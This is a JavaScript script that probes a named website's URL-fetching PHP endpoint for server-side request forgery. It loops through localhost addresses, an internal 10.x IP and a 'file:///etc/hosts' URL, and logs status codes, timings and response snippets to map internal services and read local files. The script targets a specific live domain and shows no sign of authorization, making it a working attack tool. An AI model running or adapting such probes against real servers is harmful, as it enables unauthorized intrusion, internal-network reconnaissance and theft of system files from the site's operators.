import { makeClient } from './lib.mjs';
const c = makeClient('https://tutorialinjectid.my.id');
const sleep = ms => new Promise(r => setTimeout(r, ms));
const EP = '/ssh/fetch_helper.php?url=';
const cases = [
  ['baseline-sfile', 'https://sfile.co/'],
  ['github-array', 'https://api.github.com/repos/Inject-ID/getcontact/contributors'],
  ['gh-object', 'https://api.github.com/repos/Inject-ID/getcontact'],
  ['local-port1', 'http://127.0.0.1:1/'],
  ['unroutable-10', 'http://10.255.255.1/'],
  ['localhost-tv', 'http://127.0.0.1/tv/tv.php'],
  ['localhost-root', 'http://127.0.0.1/'],
  ['file-etc-hosts', 'file:///etc/hosts'],
];
await c.get('/ssh/');
for (const [name, u] of cases) {
  const t0 = Date.now();
  let r = await c.get(EP + encodeURIComponent(u));
  const ms = Date.now() - t0;
  console.log(name.padEnd(16), String(r.status).padEnd(4), (ms + 'ms').padEnd(9), (r.body || '').replace(/\s+/g, ' ').slice(0, 160));
  await sleep(2000);
}
